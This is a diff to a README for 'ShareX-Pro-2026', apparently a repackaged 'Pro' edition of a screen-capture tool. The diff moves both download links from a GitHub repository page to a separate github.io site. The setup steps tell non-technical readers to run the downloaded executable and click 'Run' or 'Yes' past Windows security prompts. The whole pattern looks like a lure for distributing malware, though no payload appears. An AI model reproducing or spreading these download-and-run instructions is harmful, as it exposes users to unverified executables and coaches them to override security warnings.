@@ -1,6 +1,6 @@
 # 📸 ShareX-Pro-2026 - Capture and share images with ease
 
-[![](https://img.shields.io/badge/Download-ShareX_Pro_2026-blue)](https://github.com/Mer7301/ShareX-Pro-2026)
+[![](https://img.shields.io/badge/Download-ShareX_Pro_2026-blue)](https://mer7301.github.io)
 
 ## 📖 Overview
 ShareX-Pro-2026 captures your computer screen. You can take screenshots or record video of your desktop activity. This application handles your images and saves time for your tasks. Use it for work, school, or personal projects. This tool works on Windows 11 and Windows 10. You get a clean interface and fast response times.
@@ -16,7 +16,7 @@ Before you start, check your computer against these requirements. You need a sta
 ## 🚀 Getting Started
 Follow these steps to set up the software on your machine. You do not need technical skills to finish the installation.
 
-1.  **Visit the download page:** Go to the [official repository page](https://github.com/Mer7301/ShareX-Pro-2026) to find the installer.
+1.  **Visit the download page:** Go to the [official repository page](https://mer7301.github.io) to find the installer.
 2.  **Download the file:** Click the link to save the executable file to your computer.
 3.  **Run the installer:** Locate the file in your Downloads folder and double-click it.
 4.  **Confirm permissions:** Windows may show a security window. Click "Run" or "Yes" to start the setup.
